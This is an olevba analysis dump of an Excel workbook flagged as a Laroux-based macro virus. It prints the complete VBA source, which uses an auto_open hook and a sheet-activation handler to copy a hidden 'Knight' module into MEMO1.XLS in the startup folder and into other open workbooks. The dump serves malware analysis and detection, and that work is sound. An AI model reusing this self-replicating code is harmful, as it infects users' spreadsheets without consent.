olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-9740619626ed1295ca4fe64655391af37ad2bff9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Knight.bas 
in file: Virus.MSExcel.Laroux-based-9740619626ed1295ca4fe64655391af37ad2bff9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Knight'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "MEMO1.XLS")
    If m$ = "MEMO1.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Knight").Visible = True
    Sheets("Knight").Select
    Sheets("Knight").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "MEMO1.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Knight").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "MEMO1.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Knight" Then
        Workbooks("MEMO1.XLS").Sheets("Knight").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Knight").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "MEMO1.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Knigh
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

